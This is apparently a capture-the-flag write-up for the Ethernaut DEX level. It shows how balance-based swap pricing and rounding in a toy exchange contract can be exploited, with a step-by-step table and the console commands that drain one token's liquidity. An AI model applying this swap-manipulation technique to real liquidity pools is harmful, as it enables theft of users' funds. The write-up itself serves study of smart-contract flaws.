# Drain 1 of the token and allow contract to report bad price

When we look at the contract, the price of the token is fetch from a math equation written inside the contract function.
```
  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```
The equation can be summarized as:

```
Swap Amount = <AMOUNT_WE_SWAP> * <DEX_BALANCE_TOKEN_WE_WANT> / <DEX_BALANCE_TOKEN_WE_SEND>
```

The vulnerabiltiy is by getting swap price through this method, the division won't calculate to a perfect integer but a fraction. In solidity, division rounds towards zero. For example, `3/2 = 1`.

We can simulate how the balance would go if we swap them.

| DEX | PLAYER |
|-|-|
| TOKEN1 - TOKEN2 | TOKEN1 - TOKEN2 |
| 100 - 100 | 10 - 10 |
| 110 - 90 | 0 - 20 |
| 86 - 110 | 24 - 0 |
| 110 - 80 | 0 - 30 |
| 69 - 110 | 41 - 0 |
| 110 - 45 | 0 - 65 |
| 0 - 90 | 110 - 20 |

The table start out of by swapping 10 token1 to token2 on second row. The outcome is as expected, normal. However when we swap all token2 (20) to token1 we get 24. The ratio of token1 : token2 should be 1 : 1 yet we get 4 extra token. So if we keep on swapping till the end, we would reach a point where one of the DEX token run out of liquidity.

To continue to need to give approval to DEX to swap for us. Under the normal circumstances we would use this function.
```
contract.approve(contract.address, 500)
```

However in this contract, they require `owner != dex` when approving.
```
function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
```

So we need to try other way. By deploying the 'ERC20.sol' contract in remix IDE to token address, we can use 'ERC20.sol' `approve` our instance address and amount we let the DEX to access. After `approve`, use `allowance` function to call the targetted instance address and owner(our address). [link](https://stackoverflow.com/questions/71986811/ethernaut-challenge-lv22-dex-allowance-approval-problem)

After these steps we should be clear to swap. Go back to browser console terminal to get token address:
```
t1 = await contract.token1()
t2 = await contract.token2()
```

Perform the swaps according to table:
```
await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)
```

Verify:
```
await contract.balanceOf(t1, instance).then(v => v.toString())

// Output: '0'
```